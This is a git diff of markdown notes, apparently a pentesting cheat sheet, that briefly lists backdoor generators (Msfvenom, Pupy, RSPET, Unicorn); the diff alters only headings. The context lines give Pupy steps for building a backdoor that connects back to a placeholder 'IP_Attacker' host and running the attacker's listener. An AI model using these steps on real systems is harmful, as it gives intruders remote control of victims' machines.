@@ -85,7 +85,7 @@ https://github.com/marc0l92/MiaoMiao_project.git
 ## Msfvenom
 Of course.
 
-## Pupy
+## Pupy
 Creates differents types of backdoors and use it's own listener. It is all automated and the process followed to use these backdoors is:
 + Victim: Run the file create using ./pupygen.py -f lin_x64  connect --host IP_Attacker
 + Attacker: ./pupysh.py
@@ -99,7 +99,7 @@ To use this backdoor you have to run:
 
 https://github.com/panagiks/RSPET.git
 
-## Unicorn
+## Unicorn
 Creates differents types of backdoors and it is all automated.
 Uses metasploit as listener.
 
